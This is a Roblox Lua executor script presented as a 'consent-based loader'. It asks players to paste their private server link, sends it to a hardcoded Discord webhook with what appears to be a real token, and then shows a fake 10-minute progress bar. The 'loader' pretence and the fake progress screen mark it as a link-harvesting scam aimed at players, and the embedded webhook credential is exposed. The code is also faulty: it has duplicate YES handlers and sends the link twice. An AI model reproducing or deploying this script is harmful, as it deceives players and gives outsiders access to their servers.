-- Consent-based Loader (Mobile/Delta Safe)
-- Sends private server link ONLY after user clicks YES

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- PUT YOUR DISCORD WEBHOOK HERE (ASCII only)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"

-- ===== GUI =====
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.7, 0.4)
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,14)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,-20,0,45)
title.Position = UDim2.new(0,10,0,10)
title.BackgroundTransparency = 1
title.Text = "Paste your Private Server Link"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextScaled = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(1,-20,0,40)
box.Position = UDim2.new(0,10,0,65)
box.PlaceholderText = "https://www.roblox.com/..."
box.Text = ""
box.ClearTextOnFocus = false
box.TextColor3 = Color3.new(1,1,1)
box.BackgroundColor3 = Color3.fromRGB(40,40,40)
box.Font = Enum.Font.Gotham
box.TextScaled = true
Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)

-- Consent prompt (English)
local consentText = Instance.new("TextLabel", frame)
consentText.Size = UDim2.new(1,-20,0,45)
consentText.Position = UDim2.new(0,10,0,115)
consentText.BackgroundTransparency = 1
consentText.Text = "Do you agree to send this link to Discord?"
consentText.TextColor3 = Color3.new(1,1,1)
consentText.Font = Enum.Font.Gotham
consentText.TextScaled = true

local yesBtn = Instance.new("TextButton", frame)
yesBtn.Size = UDim2.new(0.45,-10,0,40)
yesBtn.Position = UDim2.new(0.05,0,1,-50)
yesBtn.Text = "YES"
yesBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
yesBtn.TextColor3 = Color3.new(1,1,1)
yesBtn.Font = Enum.Font.GothamBold
yesBtn.TextScaled = true
Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0,10)

local noBtn = Instance.new("TextButton", frame)
noBtn.Size = UDim2.new(0.45,-10,0,40)
noBtn.Position = UDim2.new(0.5,0,1,-50)
noBtn.Text = "NO"
noBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)
noBtn.TextColor3 = Color3.new(1,1,1)
noBtn.Font = Enum.Font.GothamBold
noBtn.TextScaled = true
Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0,10)

-- ===== FUNCTIONS =====
local function sendWebhook(link)
    if WEBHOOK_URL == "" then return end
    local payload = {
        content = "Private Server Link:\n" .. link
    }
    pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- ===== BUTTONS =====
yesBtn.MouseButton1Click:Connect(function()
    if box.Text == "" then return end
    sendWebhook(box.Text)  -- ONLY after YES
    gui:Destroy()
end)

noBtn.MouseButton1Click:Connect(function()
    gui:Destroy() -- NO = nothing sent
end)
-- ===== FULLSCREEN PROGRESS =====
local full = Instance.new("Frame", gui)
full.Visible = false
full.Size = UDim2.fromScale(1,1)
full.BackgroundColor3 = Color3.fromRGB(10,10,10)

local label = Instance.new("TextLabel", full)
label.Size = UDim2.fromScale(1,0.2)
label.Position = UDim2.fromScale(0,0.4)
label.BackgroundTransparency = 1
label.Text = "0%"
label.TextColor3 = Color3.new(1,1,1)
label.Font = Enum.Font.GothamBold
label.TextScaled = true

local barBG = Instance.new("Frame", full)
barBG.Size = UDim2.fromScale(0.8,0.04)
barBG.Position = UDim2.fromScale(0.1,0.6)
barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)

local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

local function startProgress()
    local duration = 600 -- 10 minutes
    for i = 1,100 do
        label.Text = i .. "%"
        bar.Size = UDim2.fromScale(i/100, 1)
        task.wait(duration/100)
    end
    label.Text = "Completed"
end
yesBtn.MouseButton1Click:Connect(function()
    if box.Text == "" then return end

    -- webhook зөвшөөрлөөр илгээнэ
    sendWebhook(box.Text)

    -- fullscreen 0→100% 10 минут
    frame.Visible = false
    full.Visible = true
    task.spawn(startProgress)
end)
